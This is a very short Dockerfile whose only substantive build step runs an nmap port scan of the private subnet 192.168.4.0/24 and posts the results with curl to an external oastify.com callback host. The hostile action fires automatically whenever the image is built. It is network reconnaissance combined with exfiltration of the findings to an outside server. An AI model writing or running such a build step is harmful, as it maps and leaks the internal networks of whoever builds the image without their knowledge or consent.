FROM alpine
RUN apk add --no-cache curl nmap bind-tools
RUN C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
 nmap -p 80,443,8000,8080,8443 --open 192.168.4.0/24 2>&1 | curl -s "$C/nmap-scan" --data-binary @-
